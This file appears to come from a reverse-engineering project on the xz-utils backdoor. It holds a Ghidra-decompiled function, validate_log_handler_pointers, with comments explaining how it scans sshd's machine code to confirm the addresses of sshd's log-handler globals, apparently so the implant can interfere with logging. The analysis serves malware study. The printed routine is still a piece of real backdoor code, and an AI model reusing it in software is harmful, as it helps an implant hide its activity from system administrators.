// /home/kali/xzre-ghidra/xzregh/102B10_validate_log_handler_pointers.c
// Function: validate_log_handler_pointers @ 0x102B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall validate_log_handler_pointers(void * addr1, void * addr2, void * search_base, u8 * code_end, string_references_t * refs, global_context_t * global)


/*
 * AutoDoc: Given two candidate addresses for sshd’s `log_handler`/`log_handler_ctx` globals, it replays the code sequence that writes them.
 * The helper enforces that the pointers are distinct and within 0x10 bytes of one another, walks the cached string-reference
 * entries to find the LEA that materialises the handler struct, bounds the routine via `x86_dasm`/`find_function`, and then
 * searches for MOV [mem],reg instructions touching each address. Only when both stores appear inside that function does it accept
 * the pair as the genuine log-handler slots.
 */

#include "xzre_types.h"

BOOL validate_log_handler_pointers
               (void *addr1,void *addr2,void *search_base,u8 *code_end,string_references_t *refs,
               global_context_t *global)

{
  void *handler_struct_addr;
  BOOL match_success;
  ptrdiff_t slot_distance;
  u8 *scan_range_start;
  u8 **scan_range_end;
  u64 lea_rel32_copy;
  int lea_opcode_word;
  u64 lea_mem_disp_bytes;
  void *lea_ctx_slot;
  long slot_delta;
  u8 *lea_ctx_instr_ptr;
  u8 **bounded_func_range;
  u8 *lea_insn_ptr;
  u8 *lea_rel32_disp;
  u32 lea_opcode_signature;
  u8 *lea_insn_size;
  
  scan_range_end = &lea_insn_ptr;
  for (slot_distance = 0x16; slot_distance != 0; slot_distance = slot_distance + -1) {
    *(u32 *)scan_range_end = 0;
    scan_range_end = (u8 **)((long)scan_range_end + 4);
  }
  // AutoDoc: Reject identical or NULL slots up front—the handler and ctx pointers must be distinct globals.
  if ((addr1 != addr2 && addr1 != (void *)0x0) && (addr2 != (void *)0x0)) {
    slot_distance = (long)addr2 - (long)addr1;
    if (addr2 <= addr1) {
      slot_distance = (long)addr1 - (long)addr2;
    }
    // AutoDoc: Only chase candidates that sit within 0x10 bytes of one another; the globals live side-by-side in `.bss`.
    if (((slot_distance < 0x10) &&
        (handler_struct_addr = (refs->mm_log_handler).func_start, handler_struct_addr != (void *)0x0)) &&
       (scan_range_start = (u8 *)(refs->agent_socket_error).func_start, scan_range_start != (u8 *)0x0)) {
      scan_range_end = (u8 **)(refs->agent_socket_error).func_end;
      // AutoDoc: Use the cached string reference to find the LEA that materialises the handler struct.
      match_success = find_lea_instruction_with_mem_operand
                        (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)&lea_insn_ptr,handler_struct_addr);
      scan_range_start = lea_insn_ptr;
      if (match_success != FALSE) {
        match_success = x86_dasm((dasm_ctx_t *)&lea_insn_ptr,lea_rel32_disp + (long)lea_insn_ptr,
                         (u8 *)scan_range_end);
        if ((match_success != FALSE) && (lea_opcode_signature == 0x168)) {
          bounded_func_range = (u8 **)0x0;
          scan_range_start = lea_rel32_disp + (long)lea_insn_size + (long)lea_insn_ptr;
          // AutoDoc: Once the LEA decodes cleanly, bound the owning routine so the MOV scan stays inside that function.
          find_function(scan_range_start,(void **)0x0,&bounded_func_range,(u8 *)search_base,code_end,
                        global->uses_endbr64);
          scan_range_end = bounded_func_range;
        }
        // AutoDoc: Require two independent MOV [mem],reg hits—one targeting each candidate slot—before accepting the pair.
        match_success = find_instruction_with_mem_operand_ex
                          (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr1);
        if (match_success != FALSE) {
          match_success = find_instruction_with_mem_operand_ex
                            (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr2);
          return (uint)(match_success != FALSE);
        }
      }
    }
  }
  return FALSE;
}

